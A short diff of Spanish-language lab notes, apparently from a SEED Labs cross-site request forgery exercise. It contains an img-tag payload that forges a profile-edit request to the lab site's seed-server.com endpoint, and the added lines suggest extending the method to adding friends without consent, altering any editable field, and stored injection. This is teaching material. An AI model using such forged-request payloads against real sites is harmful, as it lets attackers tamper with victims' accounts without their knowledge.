@@ -70,3 +70,9 @@ burpsuite &> /dev/null & disown
 <img src="http://www.seed-server.com/action/profile/edit?name=HACKED&description=&accesslevel%5bdescription%5d=2&briefdescription=&accesslevel%5bbriefdescription%5d=2&location=&accesslevel%5blocation%5d=2&interests=&accesslevel%5binterests%5d=2&skills=&accesslevel%5bskills%5d=2&contactemail=&accesslevel%5bcontactemail%5d=2&phone=&accesslevel%5bphone%5d=2&mobile=&accesslevel%5bmobile%5d=2&website=&accesslevel%5bwebsite%5d=2&twitter=&accesslevel%5btwitter%5d=2&guid=56"alt="image"width="1"height="1"/>
 ```
 - Enviando esto nos permitiría cambiar el nombre de usuario de la persona que abra el mensaje 
+- Tambien podriamos utilizar el mismo metodo a traves de la dirección URL
+
+# Tips o datos:
+- Podriamos utilizar este mismo metodo para poder agregar amigos a la lista sin necesidad de que la acepten
+- Podríamos vulnerar cualquier campo que sea editable 
+- También podríamos insertar código en nuestro perfil para que cuando la gente la vea se inyecte del texto por detrás y así lograr cambiar áreas textiables.
